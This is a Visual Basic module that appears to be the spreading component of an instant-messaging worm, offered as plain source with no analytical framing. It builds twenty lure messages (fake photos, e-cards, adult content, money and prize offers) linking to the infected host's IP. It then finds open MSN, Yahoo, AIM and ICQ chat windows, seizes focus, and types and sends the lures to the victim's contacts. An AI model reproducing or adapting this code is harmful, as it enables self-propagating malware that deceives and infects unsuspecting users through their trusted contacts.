   Attribute VB_Name = "MsgMod"
   Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   Public Declare Function EnumWindows Lib "user32" (ByVal lpfn As Long, lParam As Any) As Boolean
   Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
   Private Declare Function GetForegroundWindow Lib "user32" () As Long
   Private Declare Function SetForegroundWindow Lib "user32" (ByVal hwnd As Long) As Long
   Public Declare Function EnumChildWindows Lib "user32" (ByVal hWndParent As Long, ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
   Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
   Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

   Private Const WM_CHAR = &H102
   Private Const WM_KEYDOWN = &H100
   Private Const WM_KEYUP = &H101
   Private Const VK_RETURN = &HD

   Private Spam(20) As String

   Public Sub SetMsg()
   On Error Resume Next
   Call GetIp

   tou = Timer + 240

   While ip = ""
   DoEvents
   If Timer > tou Then Exit Sub
   Wend

   If Len(ip) > 6 Then Form1.Timer3.Enabled = False

   If InStr(LCase(LangID()), "español") <> 0 Then
   Spam(0) = "Mira esta foto, esta buena http://" & ip & "/fenomeno.jpg"
   Spam(1) = "Ha recibido una postal electronica http://" & ip & "/postid.jpg"
   Spam(2) = "Mira esta web http://" & ip & "/pass.htm ,Seguro te interesara"
   Spam(3) = "Mira mi foto http://" & ip & "/foto.jpg"
   Spam(4) = "XXX Sex Teens Lesb http://" & ip & "/sexteen.jpg"
   Spam(5) = "Invitacion a iniciar Juego http://" & ip & "/juego01.htm"
   Spam(6) = "Ha recibido un email http://" & ip & "/index.htm"
   Spam(7) = "Gana dinero en internet http://" & ip & "/money.htm"
   Spam(8) = "Mira esta ilusion optica http://" & ip & "/ilusion.jpg"
   Spam(9) = "Bajate este video, esta bueno http://" & ip & "/video02.avi"
   Spam(10) = "Mira este Cartoon http://" & ip & "/cartoon.mpg"
   Spam(11) = "Escucha este mp3 http://" & ip & "/CartaSantaClaus2.mp3"
   Spam(12) = "Conoce los secretos de ocultismo http://" & ip & "/BibliaSecretaMonjes.txt"
   Spam(13) = "Nueva Seccion Manual de Seduccion http://" & ip & "/seduc.htm"
   Spam(14) = "Conoces como piensa el sexo opuesto? http://" & ip & "/psicosex.htm"
   Spam(15) = "Solo para mayores de 18 años http://" & ip & "/Xvideo.avi"
   Spam(16) = "Radio On-line http://" & ip & "/listen.pls"
   Spam(17) = "Invitacion para recibir señal de camara web http://" & ip & "/webcam.avi"
   Spam(18) = "Cancion del Mamut tercera parte http://" & ip & "/mamut3.mp3"
   Spam(19) = "Participa en el sorteo y gana una super computadora http://" & ip & "/gratispc.htm"
   Else
   Spam(0) = "looks at this picture, this good http://" & ip & "/phenomenon.jpg"
   Spam(1) = "has received a postcard electronic http://" & ip & "/postid.jpg"
   Spam(2) = "looks at this web http://" & ip & "/pass.htm ,Sure it interested you"
   Spam(3) = "looks at my picture http://" & ip & "/picture.jpg"
   Spam(4) = "XXX Sex Teens Lesb http://" & ip & "/sexteen.jpg"
   Spam(5) = "Invitation to begin Plays http://" & ip & "/game01.htm"
   Spam(6) = "has received an email http://" & ip & "/index.htm"
   Spam(7) = "It makes money in internet http://" & ip & "/money.htm"
   Spam(8) = "looks at this illusion optic http://" & ip & "/ilusion.jpg"
   Spam(9) = "It discharges this video, this good http://" & ip & "/video02.avi"
   Spam(10) = "This Cartoon looks http://" & ip & "/cartoon.mpg"
   Spam(11) = "listens this mp3 http://" & ip & "/LetterSacredClaus2.mp3"
   Spam(12) = "knows the secrets of ocultismo http://" & ip & "/BibleSecretMonks.txt"
   Spam(13) = "New Manual Section of Seduction http://" & ip & "/seduc.htm"
   Spam(14) = "Do you know like thinks the opposite sex? http://" & ip & "/psicosex.htm"
   Spam(15) = "Alone it stops bigger than 18 years http://" & ip & "/Xvideo.avi"
   Spam(16) = "Radio On-line http://" & ip & "/listen.pls"
   Spam(17) = "Invitation to receive sign of camera web http://" & ip & "/webcam.avi"
   Spam(18) = "Song of the Mammoth third part http://" & ip & "/mamut3.mp3"
   Spam(19) = "It participates in the I draw and it wins a super computer http://" & ip & "/freepc.htm"
   End If

   End Sub

   Public Function EnumWin(ByVal hwnd As Long, lParam As Long) As Boolean
   On Error Resume Next
   Dim l As Long, wnc As String

   DoEvents

   wnc = Space$(256)
   l = GetClassName(ByVal hwnd, wnc, Len(wnc))
   wnc = Left$(wnc, l)

   If InStr(LCase(wnc), "imwindowclass") <> 0 Then
   SpamMsn (hwnd)
   End If

   If InStr(LCase(wnc), "imclass") <> 0 Then
   SpamYms (hwnd)
   End If

   If InStr(LCase(wnc), "aim_imessage") <> 0 Then
   Call EnumChildWindows(ByVal hwnd, AddressOf EnumChildProc, ByVal 0&)
   End If

   If Left$(wnc, 1) = "#" Then
   SpamIcq (hwnd)
   End If

   EnumWin = True
   End Function

   Private Sub SpamMsn(ByVal mHwnd)
   On Error Resume Next
   Dim l As Long, aw As Long

   aw = GetForegroundWindow

   Do
   Call SetForegroundWindow(ByVal mHwnd)
   Loop Until GetForegroundWindow = mHwnd

   Randomize: z = Int(Rnd * 20): Sleep 1000

   l = FindWindowEx(mHwnd, 0, "DirectUIHWND", vbNullString)

   If l = 0 Then Exit Sub

       For i = 1 To Len(Spam(z))
           Call PostMessage(l, WM_CHAR, Asc(Mid(Spam(z), i, 1)), 0)
       Next

   Call PostMessage(l, WM_KEYDOWN, VK_RETURN, 0&)
   Call PostMessage(l, WM_KEYUP, VK_RETURN, 0&)

   Sleep 1000
   Call SetForegroundWindow(aw)
   End Sub

   Private Sub SpamYms(ByVal yHwnd)
   On Error Resume Next
   Dim l As Long, aw As Long

   aw = GetForegroundWindow

   Do
   Call SetForegroundWindow(ByVal yHwnd)
   Loop Until GetForegroundWindow = yHwnd

   Randomize: z = Int(Rnd * 20): Sleep 1000

   l = FindWindowEx(yHwnd, 0, "RICHEDIT20a", vbNullString)

   If l = 0 Then l = FindWindowEx(yHwnd, 0, "RICHEDIT", vbNullString)

   If l = 0 Then Exit Sub

       For i = 1 To Len(Spam(z))
           Call PostMessage(l, WM_CHAR, Asc(Mid(Spam(z), i, 1)), 0)
       Next

   Call PostMessage(l, WM_KEYDOWN, VK_RETURN, 0&)
   Call PostMessage(l, WM_KEYUP, VK_RETURN, 0&)

   Sleep 1000
   Call SetForegroundWindow(aw)
   End Sub

   Public Function EnumChildProc(ByVal chWnd As Long, ByVal lParam As Long) As Long
   On Error Resume Next
   Dim l As Long, wnc As String

   DoEvents

   wnc = Space$(256)
   l = GetClassName(ByVal chWnd, wnc, Len(wnc))
   wnc = Left$(wnc, l)

   If LCase(wnc) = "ate32class" Then
   SpamAim (chWnd)
   End If

   EnumChildProc = 1
   End Function

   Private Sub SpamAim(ByVal aHwnd)
   On Error Resume Next
   Dim aw As Long

   aw = GetForegroundWindow

   Do
   Call SetForegroundWindow(ByVal aHwnd)
   Loop Until GetForegroundWindow = aHwnd

   Randomize: z = Int(Rnd * 20): Sleep 1000

       For i = 1 To Len(Spam(z))
           Call PostMessage(aHwnd, WM_CHAR, Asc(Mid(Spam(z), i, 1)), 0)
       Next

   Call PostMessage(aHwnd, WM_KEYDOWN, VK_RETURN, 0&)
   Call PostMessage(aHwnd, WM_KEYUP, VK_RETURN, 0&)

   Sleep 1000
   Call SetForegroundWindow(aw)
   End Sub

   Private Sub SpamIcq(iHwnd)
   On Error Resume Next
   Dim l As Long, aw As Long

   aw = GetForegroundWindow

   Do
   Call SetForegroundWindow(ByVal iHwnd)
   Loop Until GetForegroundWindow = iHwnd

   Randomize: z = Int(Rnd * 20): Sleep 1000

   l = FindWindowEx(iHwnd, 0, "RICHEDIT20a", vbNullString)

   If l = 0 Then Exit Sub

       For i = 1 To Len(Spam(z))
           Call PostMessage(l, WM_CHAR, Asc(Mid(Spam(z), i, 1)), 0)
       Next

   Call PostMessage(l, WM_KEYDOWN, VK_RETURN, 0&)
   Call PostMessage(l, WM_KEYUP, VK_RETURN, 0&)

   Sleep 1000
   Call SetForegroundWindow(aw)
   End Sub
